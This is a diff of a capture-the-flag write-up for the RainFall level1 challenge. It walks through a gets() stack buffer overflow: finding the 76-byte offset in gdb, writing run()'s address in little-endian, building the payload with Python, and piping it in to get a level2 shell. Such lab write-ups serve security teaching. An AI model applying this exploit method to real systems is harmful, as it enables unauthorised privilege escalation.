@@ -13,50 +13,40 @@ level1
 	level1@RainFall:~$ ./level1 test
 	█
 	```
-*	So we get an endless loop here, let's do as usual
-	```console
-	root@DESKTOP-69N2SL4:~# scp -P 4242 level1@192.168.29.4:~/level1 .
-	root@DESKTOP-69N2SL4:~# ./getFunctions.sh
-	```
-*	When we take a look at the main it looks like I was wrong, the code use the function `gets()` which led me to think that the program is reading the input (My mistake here, I should've at least tried to add something)
-*	We also have another function called `run()`, this one uses `fwrite()`.
-*	Looking deeper into gdb, we can see that it takes $eax=`("Good... Wait what?\n")` and then it calls `system()` to execute `/bin/sh`
-*	So, now we are dealing with a [Buffer Overflow Attack](https://www.imperva.com/learn/application-security/buffer-overflow/)
-*	Here we can see the buffer is sized `80` bytes
-	```assembly
-	sub    $0x50,%esp
-	```
-*	Instead of using i used a generated string from this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to make sure the address is ok
-	```console
-	level1@RainFall:~$ echo str > /tmp/exlpoit
-	```
-*	Since this program is more of a buffer *over-READ* issue, we need to put our exploit in a file instead of doing it on the terminal directly
-	```console
-	level1@RainFall:~$ gdb ./level1
-	(gdb) r < /tmp/exploit
-	Starting program: /home/user/level1/level1 < /tmp/exploit
+	`./level1` is execute as `level2` user
+*	It is reading on `STDIN`
+*	From now on I will be using [Ghidra](https://ghidra-sre.org/) as a decompiler even tho I made a small script to disassemble our programs
+*	Let's take a look at the [code](./source/level1.c)
+*	The `main` declares a variable of `76` bytes on the stack and executes `gets()` on it
+*	We also have another function called `run()` (which is never called btw) :
+	-	execute `fwrite()` with and string on STDOUT
+	-	calls `system()` to execute `/bin/sh`
+*	We want to try a [Buffer Overflow Attack](https://www.imperva.com/learn/application-security/buffer-overflow/) to access the function to execute `/bin/sh` as level2
+*	We can use a generated string from this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to make the offset easier to spot
+	```gdb
+	(gdb) r
+	Starting program: /home/user/level1/level1 
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A
 
 	Program received signal SIGSEGV, Segmentation fault.
 	0x63413563 in ?? ()
+	(gdb) 
 	```
-*	I found this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to get calculate the offset and it is `76`
-*	Our exploit will be the usgin the run function.
-	```assembly
-	08048444 <run>:
+	It makes it easier to spot since when we take a look at `$eip`, we can check the corresponding 4 bytes `0x63413563` since every 4 bytes is different in this string. we confirm that the offset is at 76 bytes
+*	Next step is to retrieve the address of `run`
+	```gdb
+	(gdb) p run
+	$1 = {<text variable, no debug info>} 0x8048444 <run>
 	```
-*	In many modern systems, including Intel x86 and x86_64 architectures, little-endian is the prevalent byte order. So we add `\x44\x84\x04\x08` in the end of the exploit.
-*	Let's try this, this time I use python to make this more readable:
+	We need not to forget the little endian rule when writting the payload -> `\x44\x84\x04\x08`
+*	We have everything we need, here is the payload :
 	```console
-	level1@RainFall:~$ python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
-	level1@RainFall:~$ cat /tmp/exploit | ./level1 
-	Good... Wait what?
-	Segmentation fault (core dumped)
+	level1@RainFall:~$ python -c 'print "a"*76  + "\x44\x84\x04\x08"' > /tmp/payload
 	```
-	Make sure to use `echo -e` if you don't use python print because the memory part won't be interpreted as binary data.
-*	The issue here is that the `/bin/sh` will shutdown because it is trying to read `STDIN`. We have to make sure cat keeps reading, there is many ways to do so :
+	Be carefull if you are using perl, python is adding a newline at the end but with `perl -e` you have to add it at the end or it won't be clean
+*	Now for the execution we have to make sure to use `cat payload -` so that it keeps listening on STDIN instead of just exiting after the segfault
 	```console
-	level1@RainFall:~$ (cat /tmp/exploit; cat) | ./level1
-	level1@RainFall:~$ cat /tmp/exploit - | ./level1
+	level1@RainFall:~$ cat /tmp/payload - | ./level1 
 	Good... Wait what?
 	whoami
 	level2
